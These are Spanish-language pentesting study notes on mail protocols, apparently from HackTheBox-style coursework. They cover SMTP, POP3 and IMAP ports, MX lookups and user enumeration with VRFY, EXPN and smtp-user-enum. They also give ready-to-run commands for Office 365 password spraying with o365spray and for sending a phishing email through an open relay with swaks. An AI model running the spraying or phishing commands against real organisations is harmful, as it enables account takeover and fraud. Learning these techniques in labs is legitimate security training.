####SMTP

##Definiciones
SMTP es el protocolo por el cual se envian y reciben mails. Al enviar uno, el servidor que usamos establece una conexion SMTP.
Cuando visitamos nuestro mail nos conectamos a un sv POP3 o IMAP4. El primero se puede configurar para que almacene los mails descargados en el servidor mientras que el segundo no elimina los mails descargados, siempre se mantienen.

Depende los puertos que usa el servidor significa una u otra cosa:
25      - SMTP sin cifrar
143    - IMAP4 sin cifrar
110     - POP3 sin cifrar
465     - SMTP cifrado   
993     - IMAP4 encriptado
994     - POP3 encriptado

##Comandos
host -t MX domminio.eu
#Nos devuelve los mails del dominio
dig MX domminio.com
#Lo mismo
dig A mail.dominio.comm
#Estos servidores de mail tienen su propia IP. Para saber esto podemos consultar los registros A de DNS

telnet ip puerto
#De esta forma podemos conectarnos al servidor

#SERVIDOR SMTP
VRFY usr
#Dentro del servidor, podemos verificar usuarios validos
EXPN user
#Enumera a usuarios si se usan listas.
MAIL FROM:mail
#Nos permite asignar un mail de envio
RCPT TO:usr
#Si el usuario es valido nos permite asignarlo como el receptor

#SERVIDOR POP3
USER usr
#Enumeramos usuarios

#AUTOMATIZAR
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
#flag M define modo, flag U lista de usuarios a usar, flag D dominio de la direccion de correo y flag t para ip

#SERVIDORES EN NUBE
python3 o365spray.py --validate --domain msplaintext.xyz
#Herramienta para ofice 365. Validamos el dominio
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz
#Si es valido podemos enumerar usuarios
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
#Al igual que con hydra, la herramienta nos permite atacar por fuerza bruta

##Definiciones
Open relay hace referencia a la posibilidad de usar el servidor para enviar mail y que aparezcan como enviados desde este.

##Comandos
nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
#Este script de nmap nos permite saber si es posible esto
swaks --from notifications@dominio.com --to employees@inlanefreight.com --header 'Subject: TITULO' --body 'PHISHING. http://mycustomphishinglink.com/' --server OPENRELAY_SV_HABILITADO
#Si open relay esta habilitado, con cualquier cliente de correo podemos enviar estos

Usar IMAP: https://www.atmail.com/blog/imap-101-manual-imap-sessions/
